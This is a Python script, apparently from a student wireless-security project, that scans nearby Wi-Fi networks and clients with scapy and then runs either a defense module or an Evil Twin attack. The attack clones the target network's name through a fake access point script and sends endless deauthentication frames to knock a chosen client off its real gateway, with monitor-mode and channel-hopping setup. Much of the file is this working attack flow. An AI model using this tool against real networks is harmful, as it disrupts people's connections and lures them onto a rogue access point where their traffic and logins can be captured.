
from itertools import count
from scapy.all import *
from threading import Thread
import pandas
import time
import os
from UI import *
# avoid wraping everything in an exception 
# (disabling Traceback on interrupt [Ctrl-c])
import signal
import sys
signal.signal(signal.SIGINT, lambda x, y: abortSettings())

import warnings

from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth

from defense import defense

warnings.filterwarnings('ignore')

# RUN EXAMPLE: sudo python3 WiFiScanner.py
# RUN EXAMPLE: sudo /bin/python3.8 /home/user/Documents/WiFiScanner.py
# (Should run with 'sudo')
# Sources can be found here: https://github.com/AlmogJakov/Protection-of-wireless-and-mobile-networks/blob/fc91a2ffe9c7dc98ee32072a3bc1d8fb9bb08943/WiFiScanner.py

stop_threads = False
# initialize the networks dataframe that will contain all access points nearby
cols = ['BSSID', 'SSID', 'dBm_Signal', 'Channel', 'Crypto']
networks = pandas.DataFrame(columns=cols, dtype=object)
user = {}


def callback(packet):
    frame = packet[Dot11]
    if packet.haslayer(Dot11Beacon):
        # Extract the MAC address of the network (address 2 = address mac of the transmitter)
        bssid = packet[Dot11].addr2
        if not networks.loc[networks["BSSID"].str.contains(bssid, case=False)].empty:
            return
        # Get the name of the network
        ssid = packet[Dot11Elt].info.decode()  # A Generic 802.11 Element
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # Extract network stats (Dot11Beacon class extend _Dot11EltUtils class which contains 'network_stats' method)
        stats = packet[Dot11Beacon].network_stats()
        # Get the channel of the AP
        channel = stats.get("channel")
        # Get the crypto (the type of network encryption)
        crypto = stats.get("crypto")
        # Add the network to the global list
        networks.loc[len(networks.index)] = (bssid, ssid, dbm_signal, channel, crypto)
    # if the FCfield is "ToDS"
    elif frame.FCfield & 0b1 != 0:
        if frame.addr1 not in user:
            user[frame.addr1] = set()
        user[frame.addr1].add(frame.addr2)


def change_channel():
    ch = 1

    while True:
        os.system(f"iwconfig {interface_attack} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)
        if stop_threads:
            break


def for_ap(frame, interface):
    while True:
        sendp(frame, iface=interface, count=100, inter=0.1, verbose=0)


def enable_monitor_mode(inter):
    os.system(f'sudo ifconfig {inter} down')
    os.system(f'sudo iwconfig {inter} mode monitor')
    os.system(f'sudo ifconfig {inter} up')


def disable_monitor_mode(inter):
    os.system(f'sudo ifconfig {inter} down')
    os.system(f'sudo iwconfig {inter} mode managed')
    os.system(f'sudo ifconfig {inter} up')


def evil_twin():
    # 12. Fake AP
    fake_ap_cmd = 'sudo gnome-terminal -- sh -c "python3 fakeAP.py ' + \
                  net['SSID'] + ' ' + str(net['Channel']) + ' ' + interface_internet + ' ' + interface_fake + ';"$SHELL'
    # print(fake_ap_cmd)
    os.system(fake_ap_cmd)

    # 13. User attack
    # Source: https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
    print('The target is: ', target_mac)
    print('\nDo not close this window (Ctrl-C to abort)')
    frame1 = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()
    frame2 = RadioTap() / Dot11(addr1=gateway_mac, addr2=target_mac, addr3=target_mac) / Dot11Deauth()

    deauth1 = threading.Thread(target=for_ap, args=(frame1, interface_attack))
    deauth2 = threading.Thread(target=for_ap, args=(frame2, interface_attack))
    deauth1.setDaemon(True)
    deauth2.setDaemon(True)
    # Loading Circle
    msg = "Operation Deauthentication Attack..."
    loading = threading.Thread(target = loadingCircle, args = (msg,))
    loading.setDaemon(True)
    loading.start()
    # END Loading Circle
    deauth1.start()
    deauth2.start()
    deauth1.join()
    deauth2.join()
    loading.join()
    
    

def abortSettings():
    print("\n\nExiting The Utility..")
    # Disable monitor mode
    # try:
    #     interface_attack
    #     disable_monitor_mode(interface_attack)
    #     print(f"\'{interface_attack}\' Monitor Mode Disabled Successfully!")
    # except:
    #     pass
    # try:
    #     interface_fake
    #     disable_monitor_mode(interface_fake)
    #     print(f"\'{interface_fake}\' Monitor Mode Disabled Successfully!")
    # except:
    #     pass
    # Cancel interface division
    try:
        if flag_divided:
            os.system("sudo iw dev mon0 interface del")
            print(f"\'mon0\' Division Deleted Successfully!")
    except:
        pass
    sys.exit()


def divideInterface(interfaces):
    val = input("Please Choose an Interface above for Dividing: ")
    while True:
            try:
                choose = int(val)
                interface = interfaces[choose - 1]
                os.system(f"sudo iw dev {interface} interface add mon0 type monitor")
                os.system(f"sudo iwconfig mon0 freq 2.484G")
                os.system(f"sudo ifconfig mon0 up")
                os.system(f"sleep 1")
                # can abort by 'sudo iw dev mon0 del'
                new_interfaces = os.listdir('/sys/class/net/')
                flag_divided = True
                print("Dividing Completed! \n(The divided Interface be automatically deleted by pressing Ctrl-c)")
                print("\nInterfaces:")
                for (i, item) in enumerate(new_interfaces, start=1):
                    print("   " + str(i) + ". " + item)
                print()
                break
            except e:
                val = input("Please Choose Interface for Dividing Again: ")
                continue
    return new_interfaces



if __name__ == "__main__":
    printWelcome()
    print('>  Available Actions:')
    print('>  1. Evil Twin Attack')
    print('>  2. Defense')
    val = input(">  Please Choose Action: ")
    while True:
        try:
            choose = int(val)
            if choose != 1 and choose != 2:
                raise Exception()
            break
        except:
            val = input("Please Choose Again: ")

    if choose == 1:
        action = 'Attack'
    else:
        action = 'Defense'

    interfaces = os.listdir('/sys/class/net/')
    print("\nInterfaces:")
    for (i, item) in enumerate(interfaces, start=1):
        print("   " + str(i) + ". " + item)
    print()

    flag_divided = False
    # interface dividing
    div = input("Do u want to divide interface? (Y-yes, else-no): ")
    print()
    if div == "Y":
        interfaces = divideInterface(interfaces)
        flag_divided = True


    val = input(f"Please Choose Interface for {action}: ")

    # 2.1 Choose card interface to attack/defense with
    while True:
        try:
            choose = int(val)
            interface_attack = interfaces[choose - 1]
            break
        except:
            val = input(f"Please Choose Interface for {action} Again: ")

    if action == 'Attack':
        # 2.2. Choose card interface to create Fake AP with
        val2 = input("Please Choose Interface for Fake AP: ")
        while True:
            try:
                if val2 == val:
                    raise Exception()
                choose = int(val2)
                interface_fake = interfaces[choose - 1]
                break
            except:
                val2 = input("Please Choose Interface for Fake AP Again: ")

        # 2.3. Choose card interface to give internet access for the Fake AP
        val3 = input("Please Choose Interface for Internet Access: ")
        while True:
            try:
                choose = int(val3)
                choosed_interface = interfaces[choose - 1]
                if choosed_interface == interface_attack or choosed_interface == interface_fake:
                    raise Exception()
                interface_internet = choosed_interface
                break
            except:
                val3 = input("Please Choose Interface for Internet Access Again: ")

    # 3. Enable monitor mode
    enable_monitor_mode(interface_attack)
    if action == 'Attack':
        enable_monitor_mode(interface_fake)

    # 4.a prepare sniffing args
    sniff_timeout = input(f"\nPlease enter scanning timeout (in seconds): ")
    # Get timeout input
    while True:
        try:
            sniff_timeout = int(sniff_timeout)
            break
        except:
            sniff_timeout = input("Please Choose Again: ")
    sniff_timeout = max(sniff_timeout, 3)
    print('\nLooking for networks.....')    
    # Loading Animation
    loading = threading.Thread(target = loadingProgressBar, args = (sniff_timeout-2, "Scanning", "Complete"))
    loading.start()

    # 4.b Start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # 5. Start sniffing (Synchronous process)
    sniff(prn=callback, iface=interface_attack, timeout=sniff_timeout)


    # 6. Stop changing channel thread
    stop_threads = True

    # 7 Check if any networks found
    if networks.iloc[:, :]["BSSID"].empty:
        print("\nNo Networks Found! Aborting the process...")
        sys.exit(1)

    # 8. Choose the AP to attack/defense
    print("\nNetwork AP\'s:")
    print(networks.iloc[:, [0, 1]])
    #print(tableize(networks))
    net_val = input(f"\nPlease enter the index of the AP you want to {action}: ")
    while True:
        try:
            net = networks.loc[int(net_val)]
        except:
            net_val = input("Please Choose Again Network: ")
            continue

        # 9. Print the Users
        i = 1
        gateway_mac = str(net[0])
        if gateway_mac in user:
            print("\n\'" + str(net["SSID"]) + "\' Clients:")
            for n in user[gateway_mac]:
                print(str(i) + ' ' + n)
                i += 1
            break
        else:
            print('This network has no user:', gateway_mac)
            net_val = input("Please Choose Again Network: ")

    # 10. Choose the Client to attack/defense
    val = input(f"\nPlease enter the index of the client you want to {action}: ")
    while True:
        try:
            client_index = int(val)
            break
        except:
            val = input("Please Choose Again: ")

    # 11. Get the Client we choose
    i = 1
    target_mac = ''
    for client in user[gateway_mac]:
        if i == client_index:
            target_mac = client
            break
        i += 1

    if action == 'Attack':
        evil_twin()
    else:
        defense(interface_attack, net, target_mac)